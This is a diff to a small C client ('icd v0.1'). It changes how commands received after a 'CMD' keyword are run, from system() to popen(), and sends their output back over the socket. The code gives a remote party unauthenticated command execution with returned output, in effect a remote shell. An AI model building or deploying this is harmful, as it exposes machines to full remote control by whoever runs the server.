@@ -35,6 +35,8 @@
 
 #define MAXDATASIZE 256
 
+#define MAX_BUF 256
+
 void print_version() {
   printf("icd v0.1\n");
   exit(EXIT_SUCCESS);
@@ -145,22 +147,38 @@ int main(int argc, char **argv) {
   while (1) {
     char * pch;
 
-    if((numbytes = recv(sockfd, buf, MAXDATASIZE - 1, 0)) == -1) {
-      perror("recv");
-      exit(1);
-    }
+    numbytes = recv(sockfd, buf, MAXDATASIZE - 1, 0);
+    if (numbytes == -1) error("ERROR on recv");
+    else if (numbytes == 0) break;
 
     buf[numbytes] = '\0';
    
     if (DEBUG == 1)
-      printf("client:received '%s' \n", buf);
+      printf("client: received %s\n", buf);
 
     pch = strtok(buf, " ");
 
     while (pch != NULL) {
       if (strcmp(pch, "CMD") == 0) {
         pch = strtok(NULL, "\r\n");
-        system(pch);
+        //system(pch);
+        FILE *fp;
+        int status, err;
+        char line[MAX_BUF + 1];
+        char str[MAX_BUF + 5];
+
+        fp = popen(pch, "r");
+        if (fp == NULL) error("ERROR: popen");
+
+        while (fgets(line, MAX_BUF, fp) != NULL) {
+          strcpy(str, "MSG ");
+          strcat(str, line);
+          err = write(sockfd, str, strlen(str)); 
+          if (err == -1) error("ERROR on write");
+        }
+
+        status = pclose(fp);
+        if (status == -1) error("ERROR: pclose");
       }       
       
       break;
